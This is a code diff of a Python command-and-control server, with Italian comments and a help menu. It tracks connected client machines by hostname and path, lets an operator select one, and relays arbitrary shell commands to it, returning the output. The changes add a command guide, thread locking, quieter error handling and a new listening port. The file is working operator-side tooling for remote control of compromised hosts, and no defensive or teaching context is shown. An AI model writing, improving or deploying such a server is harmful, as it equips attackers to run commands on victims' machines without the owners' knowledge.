@@ -16,7 +16,10 @@ class ClientHandler:
         self.conn.send(data.encode('utf-8'))
 
     def receive(self, buffer_size=4096):
-        return self.conn.recv(buffer_size).decode('utf-8', errors="replace")
+        try:
+            return self.conn.recv(buffer_size).decode('utf-8', errors="replace")
+        except:
+            return ""
 
     def close(self):
         self.conn.close()
@@ -24,76 +27,87 @@ class ClientHandler:
 
 class C2Server:
     """Il nucleo del Server Command & Control."""
-    def __init__(self, host='0.0.0.0', port=8081, max_conns=5):
+    def __init__(self, host='0.0.0.0', port=7771, max_conns=5):
         self.host = host
         self.port = port
         self.max_connections = max_conns
         
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.clients = {}  # {id: ClientHandler}
+        self.clients = {}  
         self.client_id_counter = 0
         self.selected_id = None
-        
-        # Lock per gestire l'accesso alla lista clients da più thread in sicurezza
         self.lock = threading.Lock()
         
         self.setup_directories()
 
     def setup_directories(self):
-        """Crea le cartelle necessarie usando pathlib."""
         Path("../log").mkdir(exist_ok=True)
         Path("../conf").mkdir(exist_ok=True)
 
     def log(self, message):
-        """Scrive i log su file."""
         log_path = Path(f"../log/server.log")
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         with open(log_path, "a") as f:
             f.write(f"[{timestamp}] {message}\n")
 
+    def display_help(self):
+        """Mostra la guida ai comandi disponibili."""
+        help_text = """
+============================================================
+           GUIDA COMANDI C2 SERVER
+============================================================
+Comandi Generali:
+  list             - Mostra tutti i client connessi
+  select <ID>      - Prende il controllo del client specificato
+  exit / quit      - Chiude il server
+  help             - Mostra questa guida
+
+Comandi Sessione (dopo 'select'):
+  back             - Torna al menu principale (mantiene connessione)
+  cclose           - Chiude la sessione e disconnette il client
+  <qualsiasi altro>- Inviato come comando shell al client
+============================================================
+"""
+        print(help_text)
+
     def start(self):
-        """Avvia il server e il thread di ascolto."""
         try:
             self.server_socket.bind((self.host, self.port))
             self.server_socket.listen(self.max_connections)
             
-            # Thread per accettare nuove connessioni
             threading.Thread(target=self.accept_loop, daemon=True).start()
             
             print(f"[*] Server avviato su {self.host}:{self.port}")
             self.log("Server Started")
+            
+            # Mostra l'help all'avvio
+            self.display_help()
+            
             self.terminal()
         except Exception as e:
             print(f"[!] Errore avvio server: {e}")
 
     def accept_loop(self):
-        """Ciclo continuo per accettare client."""
         while True:
-            conn, addr = self.server_socket.accept()
-            
-            with self.lock:
-                if len(self.clients) < self.max_connections:
-                    self.client_id_counter += 1
-                    new_client = ClientHandler(conn, addr)
-                    
-                    # Ricezione handshake iniziale (es. hostname e path)
-                    try:
+            try:
+                conn, addr = self.server_socket.accept()
+                with self.lock:
+                    if len(self.clients) < self.max_connections:
+                        self.client_id_counter += 1
+                        new_client = ClientHandler(conn, addr)
+                        
                         data = new_client.receive().strip()
-                        # Formato atteso dal client: "Path#Hostname"
                         if "#" in data:
                             new_client.current_path, new_client.hostname = data.split("#")
                         
                         self.clients[self.client_id_counter] = new_client
-                        print(f"\n[+] Nuovo client connesso: {addr} (ID: {self.client_id_counter})")
-                        self.log(f"Connected: {addr}")
-                    except Exception as e:
-                        print(f"[!] Errore handshake: {e}")
+                        print(f"\n[+] Nuovo client: {addr} (ID: {self.client_id_counter})")
+                    else:
                         conn.close()
-                else:
-                    conn.close()
+            except:
+                break
 
     def list_clients(self):
-        """Mostra la lista dei client connessi."""
         print("\nID\tIndirizzo\t\tHostname")
         print("-" * 45)
         with self.lock:
@@ -102,16 +116,25 @@ class C2Server:
         print("-" * 45)
 
     def terminal(self):
-        """Interfaccia di comando principale."""
         while True:
             if not self.selected_id:
-                cmd = input("\nC2-Server > ").strip().lower()
+                cmd = input("C2-Server > ").strip().lower()
             else:
-                target = self.clients[self.selected_id]
+                with self.lock:
+                    if self.selected_id not in self.clients:
+                        print("[!] Client disconnesso.")
+                        self.selected_id = None
+                        continue
+                    target = self.clients[self.selected_id]
                 cmd = input(f"[{self.selected_id}] {target.hostname}@{target.current_path} > ").strip()
 
+            if not cmd: continue
+
             if cmd in ['exit', 'quit']:
+                print("[*] Spegnimento server...")
                 break
+            elif cmd == 'help':
+                self.display_help()
             elif cmd == 'list':
                 self.list_clients()
             elif cmd.startswith('select '):
@@ -119,8 +142,9 @@ class C2Server:
                     cid = int(cmd.split(' ')[1])
                     if cid in self.clients:
                         self.selected_id = cid
+                        print(f"[*] Sessione avviata con ID {cid}")
                     else:
-                        print("[!] ID non valido.")
+                        print("[!] ID non trovato.")
                 except: print("[!] Uso: select <id>")
             elif cmd == 'back':
                 self.selected_id = None
@@ -128,28 +152,33 @@ class C2Server:
                 self.send_command(cmd)
 
     def send_command(self, cmd):
-        """Invia comando al client selezionato e gestisce la risposta."""
-        target = self.clients[self.selected_id]
+        with self.lock:
+            target = self.clients.get(self.selected_id)
+        
+        if not target: return
+
         try:
             target.send(cmd)
             if cmd == 'cclose':
                 with self.lock:
                     del self.clients[self.selected_id]
+                print(f"[*] Sessione ID {self.selected_id} chiusa.")
                 self.selected_id = None
                 return
 
-            # Ricezione output (gestione semplificata per esempio)
             response = target.receive()
             if "#path#" in response:
                 output, path = response.split("#path#")
-                target.current_path = path
-                print(output)
+                target.current_path = path.strip()
+                if output.strip() and output.strip() != ".":
+                    print(output)
             else:
                 print(response)
-        except Exception as e:
-            print(f"[!] Connessione persa con ID {self.selected_id}: {e}")
+        except:
+            print(f"[!] Connessione persa con ID {self.selected_id}")
             with self.lock:
-                del self.clients[self.selected_id]
+                if self.selected_id in self.clients:
+                    del self.clients[self.selected_id]
             self.selected_id = None
 
 if __name__ == "__main__":
